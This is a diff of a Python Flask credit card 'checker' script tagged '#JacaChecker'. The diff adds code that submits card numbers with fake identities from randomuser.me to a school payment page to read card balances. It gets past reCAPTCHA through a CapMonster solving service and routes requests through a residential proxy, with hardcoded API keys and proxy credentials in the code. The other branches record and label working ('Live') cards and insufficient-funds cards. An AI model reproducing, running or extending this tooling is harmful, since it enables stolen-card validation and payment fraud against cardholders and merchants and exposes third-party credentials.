@@ -11,13 +11,14 @@ from colorama import Fore
 
 disable_warnings()
 
-    
+
 app = Flask(__name__)
 
 CORS(app)
     
 def pegarItem(data, esquerda, direita):
     return data.partition(esquerda)[-1].partition(direita)[0]
+
 
 def criarTask():
     data = {
@@ -43,6 +44,30 @@ def criarTask():
         time.sleep(1)
 
 
+def Saldo():
+    data = {
+        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
+        "task": {
+            "type": "RecaptchaV2EnterpriseTask",
+            "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
+            "websiteKey": "6LfFHhQUAAAAAFFMGjELVU4DwN8oDECRFp1nCupe",
+        },
+    }
+    criar = requests.post(
+        "https://api.capmonster.cloud/createTask", verify=False, json=data
+    )
+    taskId = criar.json()["taskId"]
+    while True:
+        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
+        resultado = requests.post(
+            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
+        )
+        print(resultado.text)
+        if '"status":"ready"' in resultado.text:
+            return resultado.json()["solution"]["gRecaptchaResponse"]
+        time.sleep(1)
+        
+        
 def api_bin(bin):
     try:
         req = requests.get(
@@ -90,14 +115,74 @@ def definir_tipo_cartao(card):
     else:
         return "Desconhecido"
     
+def retesteSaldo(card, month, year, cvv):
+        saldo(card, month, year, cvv)
+        
+def saldo(card, month, year, cvv):
+        try:    
+        
+            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
+            headers = {
+                    'Host': 'randomuser.me',
+                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+                    'accept': 'application/json, text/plain, */*',
+                    'sec-ch-ua-mobile': '?0',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'origin': 'https://namso-gen.com',
+                    'sec-fetch-site': 'cross-site',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-dest': 'empty',
+                    'referer': 'https://namso-gen.com/',
+                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
+                    }
 
-    
+            response = requests.get( url, headers=headers, verify=False)
+            email = pegarItem(response.text, '"email":"','"')
+            nome = pegarItem(response.text, '"first":"','"')
+            sobrenome = pegarItem(response.text, '"last":"','"')
+            street = pegarItem(response.text, '"name":"','"},"city"')
+            snumber = pegarItem(response.text, '"street":{"number":',',')
+            city = pegarItem(response.text, '"city":"','"')
+            state = pegarItem(response.text, '"state":"','"')
+            state = state[0:2].upper()
+            postcode = pegarItem(response.text, '"postcode":',',')
+            company = pegarItem(response.text, '"username":"','"')
+            tel = random.randint(1111,9999)
+            tel2 = random.randint(111,999)
+            tel3 = random.randint(111,999)
+            recap = Saldo()
+            
+            if len(year) == 4:
+                year = year[2:]
+                
+            url = "https://www.eduwhere.com/secure/autopay_confirm.php"
+            payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
+            headers = {
+                'Host': 'www.eduwhere.com',
+                'content-type': 'application/x-www-form-urlencoded',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                }
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
+            if 'ssl_account_balance' in response.text:
+                dolar = pegarItem(response.text, '&amp;ssl_account_balance=','&')
+                return dolar
+ 
+            
+            
+        except requests.exceptions.ProxyError:
+            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
+            retesteSaldo(card, month, year, cvv)
+        except requests.exceptions.ConnectionError:
+            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
+            retesteSaldo(card, month, year, cvv)
+        except requests.exceptions.RequestException:
+            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
+            retesteSaldo(card, month, year, cvv)
     
     
 def checker(card, month, year, cvv):
-    
-    
-        
     try:
         url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
         headers = {
@@ -133,7 +218,7 @@ def checker(card, month, year, cvv):
         
         if response.status_code == 200:
             time.sleep(5)
-            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
+            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
             start_time = time.time() 
 
 
@@ -255,37 +340,26 @@ def checker(card, month, year, cvv):
                 'Content-Type': 'text/plain'
                 }
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            time.sleep(4)
-                
-                    
-
+            time.sleep(2)
             elapsed_time = time.time() - start_time
-            
             MSegundos = round(elapsed_time, 2)
             
 
-
-
-            if 'adress' in response.text:
+            if 'Insufficient funds' in response.text:
+                dolar = saldo(card, month, year, cvv)
                 bin = api_bin(card[:6])              
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
-                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
-                print(Fore.GREEN + f"{x} #JacaChecker")     
-                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
-            
-            elif 'Insufficient funds' in response.text:
-                bin = api_bin(card[:6])              
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos}] MS"                          
-                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF  [ USD: {dolar} ]"                          
+                #open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                 print(Fore.GREEN + f"{x} #JacaChecker") 
-                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                 
             elif 'Unidentifiable error issuer generated' in response.text:
+                dolar = saldo(card, month, year, cvv)
                 bin = api_bin(card[:6])              
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos}] MS"                          
-                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19  [ USD: {dolar} ]"                    
+                #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                 print(Fore.GREEN + f"{x} #JacaChecker") 
-                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                     
             elif 'expired' in response.text:  
                 bin = api_bin(card[:6])
